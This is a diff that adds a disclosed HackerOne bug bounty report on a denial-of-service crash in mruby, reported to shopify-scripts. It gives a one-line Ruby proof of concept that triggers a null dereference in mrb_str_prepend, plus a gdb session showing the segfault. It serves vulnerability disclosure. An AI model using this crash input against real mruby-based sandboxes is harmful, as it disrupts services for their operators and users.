@@ -1,0 +1,31 @@
+ReportLink:https://hackerone.com/reports/193081
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/tunz
+ReportedTo:shopify-scripts(shopify-scripts)
+BountyAmount:800.0
+Severity:
+State:Closed
+DateOfDisclosure:07.02.2017 7:42:12
+
+Summary:
+
+# PoC
+```ruby
+String.new.prepend("")
+```
+
+# Cause
+This crash is caused by null dereference in
+https://github.com/mruby/mruby/blob/master/mrbgems/mruby-string-ext/src/string.c#L474
+
+# Test
+```
+$ gdb -q --args ./bin/mruby test4.rb
+Reading symbols from ./bin/mruby...done.
+(gdb) r
+Starting program: /home/tunz/working/mruby/mruby/bin/mruby test4.rb
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000464553 in mrb_str_prepend (mrb=0x1538010, self=...) at /home/tunz/working/mruby/mruby/mrbgems/mruby-string-ext/src/string.c:474
+474       RSTR_PTR(s1)[len] = '\0';
+```
